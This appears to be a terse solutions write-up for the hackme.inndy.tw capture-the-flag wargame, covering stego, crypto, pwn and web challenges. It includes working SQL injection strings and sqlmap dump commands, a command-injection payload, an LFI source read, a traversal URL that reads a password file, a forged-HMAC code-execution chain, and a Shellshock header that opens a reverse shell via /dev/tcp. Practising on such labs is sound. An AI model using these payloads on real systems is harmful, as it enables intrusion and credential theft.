# hackme.inndy.tw Solve
## 2
 using `stegsolve` open `corgi-can-fly.png`
 

## 3
  ``` bash
  strings television.bmp |grep 'FLAG'
  ```

## 5 regex
  ``` bash  
    grep 'FLAG{[^{}()@]*}' flag -o
  ```

## 15
  search `FLAG{` on index page

## 16 guestbook
  ```
  sqlmap -u "https://hackme.inndy.tw/gb/?mod=post" --method POST -p "content,title" --data "title=a&content=b" --level=3 --risk=3
  sqlmap -u "https://hackme.inndy.tw/gb/?mod=post" --method POST -p "content,title" --data "title=abx&content=asdb" --dump
  ```

## 17
  ```
    # test LFI
    https://hackme.inndy.tw/lfi/index.php?page=./pages/login

    # get source
    https://hackme.inndy.tw/lfi/index.php?page=php://filter/read=convert.base64-encode/resource=pages/login
  ```
  decode source code
  ``` bash
    echo "PD9waHAKcmVxdWlyZSgnY29uZmlnLnBocCcpOwppZigkX1BPU1RbJ3VzZXInXSA9PT0gJ2FkbWluJyAmJiBtZDUoJF9QT1NUWydwYXNzJ10pID09PSAnYmVkMTI4MzY1MjE2YzAxOTk4ODkxNWVkM2FkZDc1ZmInKSB7CiAgICBlY2hvICRmbGFnOwp9IGVsc2Ugewo/Pgo8Zm9ybSBhY3Rpb249Ij9wYWdlPXBhZ2VzL2xvZ2luIiBtZXRob2Q9InBvc3QiIHJvbGU9ImZvcm0iPgoJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CgkJPGxhYmVsIGZvcj0idXNlci1pIj5Vc2VyPC9sYWJlbD4KCQk8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9InVzZXItaSIgcGxhY2Vob2xkZXI9IlVzZXJuYW1lIiBuYW1lPSJ1c2VyIj4KCTwvZGl2PgoJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CgkJPGxhYmVsIGZvcj0icGFzcy1pIj5QYXNzd29yZDwvbGFiZWw+CgkJPGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0icGFzcy1pIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiIG5hbWU9InBhc3MiPgoJPC9kaXY+Cgk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+TG9naW48L2J1dHRvbj4KPC9mb3JtPgo8P3BocCB9ID8+Cg=="| base64 -d |less
  ```
  Get password md5 code, and using the rainbow table attack.
  
## 18 homepage
  `f12`->`console`

## 19 ping (os command injectio)
  `$(tail *)`

## 20 scoreboard
  http header

## 21 SQL Injection
  user: `admin`, password:``\' or `user`= "admin" #``

## 23
  `\'/**/or/**/name<>"guest"#`

## 31
  create cookie `show_hidden`:`yes`

## 32
  editor vulnerability, password save in file  
  [cat flag](https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../.config/.htusers.php)
  crack by rainbow table

## 33 
  1. set `action=debug`, `dir` is `dir[]` make `strcmp()` function return `0`
  2. generate payload
  ``` php
    <?php
    function make_command($cmd) {
        $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3');
        return sprintf('%s.%s', base64_encode($cmd), $hmac);
    }
    echo make_command($_GET['cmd']);
    ?>
  ```
  3. payload `$_GET["a"]($_GET["cmd"]);`
  to `JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182`
  4. 
    - [step1](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=ls)
    - [step2](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=ls%20flag3)
    - [step3](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=cat%20flag3/meow.c)
    - [step4](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=./flag3/meow%20flag3/flag3)

## 37
  using LFI get the source code and
the source code will execute `putenv()` function, and the `bash`
4.3 has `shellshock` then set a payload in http header, open reverse shell

`() { : ; }; /bin/bash -i >& /dev/tcp/`**`ip`**`/`**`port`**` 0>&1 &`

```bash
cd /
flag-reader flag < /var/tmp/1 > /var/tmp/1
cat /var/tmp/1
```

## 41 helloworld
  ```
    objdump -d helloworld | less
  ```
  then find `main` label, then find `cmp` instruction

## 42 simple
  ``` bash 
    strings ./simple-rev|less
  ```
  found a caesar cipher and decode


## 57 catflag
  connect to server then type
  ``` bash
    cat flag
  ```

## 58 
  find the address of `<call_me_maybe>` is `0x080485fb`

  find the return address location `ebp + 4`(14) is 10 (array) + 3 (local
  variable) `integers`  look from the array

  theb use `edit number` then type `14`, `134514171` (0x080485fb) get the shell

## 59
  find the buffer size, using `pwntools` and `ROPgadget` in `python2`

## 60
  write `/bin/sh` to `.data`

## 61
  binary search

## 63
  %hhn

## 66
  create `flag` file then make number of char enough,
  find the `argv[0]` then replace to flag buffer

## 81 easy
  hex and base64

## 82 r u kidding
  using Caesar Cipher decoder, `a->z`

## 83 not hard 
  ``` python 
    import base64
    base64.b32decode(base64.b85decode("Nm@rmLsBy{Nm5u-K{iZKPgPMzS2I*lPc%_SMOjQ#O;uV{MM*?PPFhk|Hd;hVPFhq{HaAH<"))
  ```

## 84 cipher 1
  using online substitution cipher solver, and fixing result

## 85 cipher 2
  using online vigenere cipher solver, then view the description about the flag 

## 97 fast
  You need the int32 overflow, and you need `coproc`, 
  and you can't use `bc` and the buffer, Otherwise, 
  you will waste your time, to write the useless script

